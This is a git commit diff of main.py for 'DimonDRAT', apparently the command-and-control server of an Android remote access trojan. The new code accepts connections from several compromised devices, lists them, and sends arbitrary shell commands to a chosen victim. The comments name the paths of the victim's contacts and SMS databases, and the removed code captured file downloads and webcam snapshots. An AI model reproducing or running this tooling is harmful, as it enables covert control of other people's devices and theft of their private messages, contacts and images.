242de2f9abcd5fcc6a567bc0138a8cf99ae6bc1a
SegYT <66474461+SegYT@users.noreply.github.com>
2021-04-27 22:23:10 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,11 @@
 import socket
+import threading
+import time
+import sys
+from queue import Queue
+import struct
+import signal
 import pyfiglet
-import os
 
 # To see the contacts of the victim use
 # cd /data/data/com.Android.providers.contacts/databases/
@@ -10,55 +15,211 @@ import os
 # cd /data/user_de/0/com.android.providers.telephony/databases/
 # and look for a mmssms database file
 
-SERVER_HOST = "0.0.0.0"
-SERVER_PORT = 3333
-
-BUFFER_SIZE = 4096
-
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
 intro = pyfiglet.figlet_format("DimonDRAT")
 
-s = socket.socket()
+COMMANDS = {'help':['Shows this help'],
+            'list':['Lists connected clients'],
+            'select':['Selects a client by its index. Takes index as a parameter'],
+            'quit':['Stops current connection with a client. To be used when client is selected'],
+            'shutdown':['Shuts server down'],
+           }
 
-s.bind((SERVER_HOST, SERVER_PORT))
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.listen(10)
+class MultiServer(object):
 
-os.system("clear")
-print(intro)
-print("\nCoded by SegYT\n")
-print("[...] Listening as " + str(SERVER_HOST) + ":" + str(SERVER_PORT) + "...")
+    def __init__(self):
+        self.host = '0.0.0.0'
+        self.port = 3333
+        self.socket = None
+        self.all_connections = []
+        self.all_addresses = []
+        print(intro)
 
-client_socket, client_address = s.accept()
-print(f"{client_address[0]}:{client_address[1]} Connected!")
+    def print_help(self):
+        for cmd, v in COMMANDS.items():
+            print("\n{0}:\t{1}\n".format(cmd, v[0]))
+        return
 
-message = "Hello!".encode()
-client_socket.send(message)
+    def register_signal_handler(self):
+        signal.signal(signal.SIGINT, self.quit_gracefully)
+        signal.signal(signal.SIGTERM, self.quit_gracefully)
+        return
 
-def download():
-  filename = input("[*]File Name: ")
-  client_socket.send(filename)
-  f = open(filename, "wb")
-  i = client_socket.recv(4096)
-  while not ("[*] Complete!" in str(i)):
-    f.write(i)
-    i = client_socket.recv(4096)
-  f.close()
+    def quit_gracefully(self, signal=None, frame=None):
+        print('\nExiting...')
+        for conn in self.all_connections:
+            try:
+                conn.shutdown(2)
+                conn.close()
+            except Exception as e:
+                print('[!] Could not close connection %s' % str(e))
+        self.socket.close()
+        sys.exit(0)
 
-while True:
-  command = input("DimonDRAT > ")
-  client_socket.send(command.encode())
-  if str(command) == "download":
-    download()
-    continue
-  if str(command) == "webcamsnap":
-    f = open("camera.png", "wb")
-    img = client_socket.recv(4096)
-    f.write(img)
-    f.close()
-    continue
-  if command.lower() == "exit":
-    break
-  results = client_socket.recv(BUFFER_SIZE).decode()
-  print(results)
-client_socket.close()
-s.close()
+    def socket_create(self):
+        try:
+            self.socket = socket.socket()
+        except socket.error as msg:
+            print("[!] Socket creation error: " + str(msg))
+            sys.exit(1)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        return
+
+    def socket_bind(self):
+        try:
+            self.socket.bind((self.host, self.port))
+            self.socket.listen(5)
+        except socket.error as e:
+            print("[!] Socket binding error: " + str(e))
+            time.sleep(5)
+            self.socket_bind()
+        return
+
+    def accept_connections(self):
+        for c in self.all_connections:
+            c.close()
+        self.all_connections = []
+        self.all_addresses = []
+        while 1:
+            try:
+                conn, address = self.socket.accept()
+                conn.setblocking(1)
+                client_hostname = conn.recv(1024).decode("utf-8")
+                address = address + (client_hostname,)
+            except Exception as e:
+                print('[!] Error accepting connections: %s' % str(e))
+                continue
+            self.all_connections.append(conn)
+            self.all_addresses.append(address)
+            print('\n[+] Connection established: {0} ({1})'.format(address[-1], address[0]))
+        return
+    
+
+    def start_turtle(self):
+        while True:
+            cmd = input('DimonDRAT > ')
+            if cmd == 'list':
+                self.list_connections()
+                continue
+            elif 'select' in cmd:
+                target, conn = self.get_target(cmd)
+                if conn is not None:
+                    self.send_target_commands(target, conn)
+            elif cmd == 'shutdown':
+                    queue.task_done()
+                    queue.task_done()
+                    print('[+] Server shutting down...')
+                    break
+            elif cmd == 'help':
+                self.print_help()
+            elif cmd == '':
+                pass
+            else:
+                print('[!] Command not recognized')
+        return
+
+    def list_connections(self):
+        results = ''
+        for i, conn in enumerate(self.all_connections):
+            try:
+                conn.send(str.encode(' '))
+                conn.recv(20480)
+            except:
+                del self.all_connections[i]
+                del self.all_addresses[i]
+                continue
+            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
+                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
+        print('----- Clients -----' + '\n' + results)
+        return
+
+    def get_target(self, cmd):
+        target = cmd.split(' ')[-1]
+        try:
+            target = int(target)
+        except:
+            print('[!] Client index should be an integer')
+            return None, None
+        try:
+            conn = self.all_connections[target]
+        except IndexError:
+            print('[!] Invalid selection!')
+            return None, None
+        print("[+] Connected to " + str(self.all_addresses[target][2]))
+        return target, conn
+
+    def read_command_output(self, conn):
+        raw_msglen = self.recvall(conn, 4)
+        if not raw_msglen:
+            return None
+        msglen = struct.unpack('>I', raw_msglen)[0]
+        return self.recvall(conn, msglen)
+
+    def recvall(self, conn, n):
+        data = b''
+        while len(data) < n:
+            packet = conn.recv(n - len(data))
+            if not packet:
+                return None
+            data += packet
+        return data
+
+    def send_target_commands(self, target, conn):
+        conn.send(str.encode(" "))
+        cwd_bytes = self.read_command_output(conn)
+        cwd = str(cwd_bytes, "utf-8")
+        print(cwd, end="")
+        while True:
+            try:
+                cmd = input()
+                if len(str.encode(cmd)) > 0:
+                    conn.send(str.encode(cmd))
+                    cmd_output = self.read_command_output(conn)
+                    client_response = str(cmd_output, "utf-8")
+                    print(client_response, end="")
+                if cmd == 'quit':
+                    break
+            except Exception as e:
+                print("[!] Connection was lost %s" %str(e))
+                break
+        del self.all_connections[target]
+        del self.all_addresses[target]
+        return
+
+
+def create_workers():
+    server = MultiServer()
+    server.register_signal_handler()
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work, args=(server,))
+        t.daemon = True
+        t.start()
+    return
+
+def work(server):
+    while True:
+        x = queue.get()
+        if x == 1:
+            server.socket_create()
+            server.socket_bind()
+            server.accept_connections()
+        if x == 2:
+            server.start_turtle()
+        queue.task_done()
+    return
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+    return
+
+def main():
+    create_workers()
+    create_jobs()
+
+
+if __name__ == '__main__':
+    main()
